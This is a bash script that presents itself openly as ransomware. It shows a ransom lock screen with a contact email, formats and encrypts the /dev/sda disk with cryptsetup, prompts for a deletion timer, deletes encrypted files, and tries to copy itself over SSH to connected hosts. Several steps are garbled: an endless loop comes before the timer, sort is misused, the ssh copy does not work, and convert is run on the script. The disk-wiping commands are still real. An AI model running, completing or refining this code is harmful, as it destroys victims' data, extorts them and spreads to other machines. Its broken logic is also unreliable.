#!/bin/bash

zenity --info --title="Your computer has been locked" --text="This computer has been locked due to non-payment of ransom. To unlock your computer, please contact us at [email protected] and provide the following code: [code]" --modal --on-close="exit" --image="picture.jpg"

cryptsetup luksFormat /dev/sda
cryptsetup open /dev/sda crypt_luks
openssl enc -aes-256-cbc -pbkdf2 -in /dev/sda -out encrypted_luks_header.bin
cryptsetup encrypt /dev/sda encrypted_luks_header.bin
cryptsetup encrypt /dev/sda encrypted_luks_header.bin

while true; do
sleep 1
done
#Add zenity timer

zenity --entry --title="File Deletion Timer" --text="Enter the time in minutes: " --entry-text="120"
#Check if time has reached 0:00

if [ "$1" -eq "0" ]; then
# Delete all encrypted files
find . -type f -name "*.encrypted" -delete
# Use netstat to get a list of all active connections
netstat -an
# Use grep to filter the list of connections to only include SSH connections
ssh_connections=$(netstat -an | grep "22")
#Use awk to extract the IP addresses of the remote hosts from the list of SSH connections

remote_hosts=$(echo "$ssh_connections" | awk '{print $5}')
# Use sort to sort the list of remote hosts in alphabetical order
sorted_hosts=$(sort "$remote_hosts")
#Use ping to send a ping to each of the remote hosts

for host in $sorted_hosts; do
ping $host
done
#Use cat to print the contents of the script to the console

cat script.sh
#Use ssh to copy the script to each of the remote hosts

for host in $sorted_hosts; do
ssh $host "cat script.sh > script.sh"
done

fi

convert --density 300 script.sh script.pdf
